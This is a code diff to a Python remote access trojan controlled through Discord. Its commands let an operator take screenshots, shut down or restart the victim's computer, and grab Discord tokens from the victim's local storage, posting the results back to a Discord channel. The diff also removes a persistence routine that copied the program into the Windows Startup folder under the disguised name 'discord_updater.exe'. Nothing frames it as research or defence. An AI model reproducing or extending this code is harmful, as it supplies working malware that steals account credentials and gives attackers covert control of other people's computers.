@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, re, shutil, json, sys
+import os, discord, subprocess, requests, re, shutil, json, sys, winreg
 from PIL import ImageGrab
 
 def get_processor():
@@ -49,7 +49,6 @@ commands = "\n".join([
     "exit - Exit the session",
     "screenshot - Take a screenshot",
     "tokens - Get all discord tokens",
-    "startup - Add to startup",
     "shutdown - Shutdown the computer",
     "restart - Restart the computer",
 ])
@@ -156,7 +155,7 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
 
-    # Token grab not working (will be fixed in next update)
+    # Token grab not working on newest Discord client (will be fixed in next update)
     if message.content == "tokens":
         paths = [
             os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
@@ -189,17 +188,6 @@ async def on_message(message):
             tokens = "No tokens found"
         embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
         await message.reply(embed=embed)
-
-    # Startup not working (will be fixed in next update)
-    if message.content == "startup":
-        path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        try:
-            shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
-            embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'discord_updater.exe')}```", color=0xfafafa)
-            await message.reply(embed=embed)
-        except:
-            embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
-            await message.reply(embed=embed)
             
     if message.content == "cwd":
         embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
